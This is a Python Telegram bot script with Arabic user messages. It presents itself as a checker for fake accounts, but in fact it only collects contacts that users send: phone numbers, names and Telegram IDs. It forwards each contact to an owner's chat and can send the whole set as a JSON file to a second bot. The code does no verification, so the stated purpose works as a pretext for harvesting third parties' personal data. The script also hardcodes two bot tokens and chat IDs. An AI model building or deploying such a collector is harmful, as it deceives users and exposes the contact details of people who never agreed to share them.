import logging
import json
import os
from telegram import Update, ForceReply, InputFile
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
# set higher logging level for httpx to avoid all GET and POST requests being logged
logging.getLogger("httpx").setLevel(logging.WARNING)

logger = logging.getLogger(__name__)

# Replace with your bot token and owner chat ID
BOT_TOKEN = "7994249219:AAEzzha4md9dpMoxgYWHCfzaF9UYNV3LmSs"
OWNER_CHAT_ID = 7374049234
SECOND_BOT_TOKEN = "7751434846:AAFpRCjSEFHBcoOdVe7dLEXGCSuWYEHwyQA"
SECOND_BOT_TARGET_CHAT_ID = 7816967280

# Store contacts in a dictionary, where keys are user_ids and values are lists of contacts
# For persistent storage, consider using a database or JSON files per user
user_contacts = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a message when the command /start is issued."""
    user = update.effective_user
    await update.message.reply_html(
        f"مرحباً {user.mention_html()}! أنا بوت للتحقق من الحسابات الوهمية. أرسل لي جهة اتصال للبدء.",
        reply_markup=ForceReply(selective=True),
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a message when the command /help is issued.""" 
    await update.message.reply_text("أرسل لي جهة اتصال وسأقوم بحفظها. يمكنك أيضاً استخدام الأمر /send_my_contacts لإرسال ملف بجهات اتصالك إلى مالك البوت.")

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle incoming contact messages."""
    contact = update.message.contact
    user_id = update.effective_user.id

    if contact:
        contact_info = {
            "phone_number": contact.phone_number,
            "first_name": contact.first_name,
            "last_name": contact.last_name if contact.last_name else "",
            "user_id": contact.user_id if contact.user_id else ""
        }
        
        if user_id not in user_contacts:
            user_contacts[user_id] = []
        user_contacts[user_id].append(contact_info)
        
        logger.info(f"Received contact from user {user_id}: {contact_info}")
        await update.message.reply_text("شكراً لك! تم استلام جهة الاتصال وحفظها.")

        # Send contact to owner (initial functionality, will be modified later)
        if OWNER_CHAT_ID:
            contact_message = (
                f"جهة اتصال جديدة من المستخدم {update.effective_user.full_name} (ID: {update.effective_user.id}):\n"
                f"رقم الهاتف: {contact.phone_number}\n"
                f"الاسم الأول: {contact.first_name}\n"
                f"الاسم الأخير: {contact.last_name if contact.last_name else 'لا يوجد'}\n"
                f"معرف المستخدم (إذا كان مستخدم تليجرام): {contact.user_id if contact.user_id else 'لا يوجد'}"
            )
            await context.bot.send_message(chat_id=OWNER_CHAT_ID, text=contact_message)
            await update.message.reply_text("تم إرسال جهة الاتصال إلى مالك البوت.")
    else:
        await update.message.reply_text("لم أتمكن من استلام جهة اتصال صالحة.")

async def send_my_contacts(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a file with all contacts received from the user to the owner or a second bot."""
    user_id = update.effective_user.id
    user_full_name = update.effective_user.full_name

    if user_id not in user_contacts or not user_contacts[user_id]:
        await update.message.reply_text("لم يتم حفظ أي جهات اتصال لك بعد.")
        return

    # Determine which bot and chat ID to send to
    if SECOND_BOT_TOKEN and SECOND_BOT_TARGET_CHAT_ID:
        target_bot_token = SECOND_BOT_TOKEN
        target_chat_id = SECOND_BOT_TARGET_CHAT_ID
        send_to_message = "إلى البوت الثاني."
    elif OWNER_CHAT_ID:
        target_bot_token = BOT_TOKEN # Use the main bot's token
        target_chat_id = OWNER_CHAT_ID
        send_to_message = "إلى مالك البوت."
    else:
        await update.message.reply_text("لا يمكن إرسال جهات الاتصال. لم يتم تحديد معرف مالك البوت أو توكن البوت الثاني ومعرف الدردشة المستهدف.")
        return

    # Create a file with user's contacts
    file_name = f"contacts_{user_id}.json"
    with open(file_name, "w", encoding="utf-8") as f:
        json.dump(user_contacts[user_id], f, ensure_ascii=False, indent=4)

    # Send the file using the appropriate bot token
    try:
        if target_bot_token == BOT_TOKEN:
            # Use the current bot instance
            await context.bot.send_document(
                chat_id=target_chat_id,
                document=InputFile(file_name),
                caption=f"جهات الاتصال الخاصة بالمستخدم {user_full_name} (ID: {user_id})"
            )
        else:
            # Create a new Application instance for the second bot
            second_bot_app = Application.builder().token(target_bot_token).build()
            await second_bot_app.bot.send_document(
                chat_id=target_chat_id,
                document=InputFile(file_name),
                caption=f"جهات الاتصال الخاصة بالمستخدم {user_full_name} (ID: {user_id})"
            )
        await update.message.reply_text(f"تم إرسال ملف جهات الاتصال الخاص بك {send_to_message}")
    except Exception as e:
        logger.error(f"Failed to send contacts file: {e}")
        await update.message.reply_text("حدث خطأ أثناء إرسال ملف جهات الاتصال.")
    
    # Clean up the created file
    os.remove(file_name)

def main() -> None:
    """Start the bot."""
    # Create the Application and pass it your bot's token.
    application = Application.builder().token(BOT_TOKEN).build()

    # On different commands - answer in Telegram
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("send_my_contacts", send_my_contacts))

    # Handle incoming contact messages
    application.add_handler(MessageHandler(filters.CONTACT, handle_contact))

    # Run the bot until the user presses Ctrl-C
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()


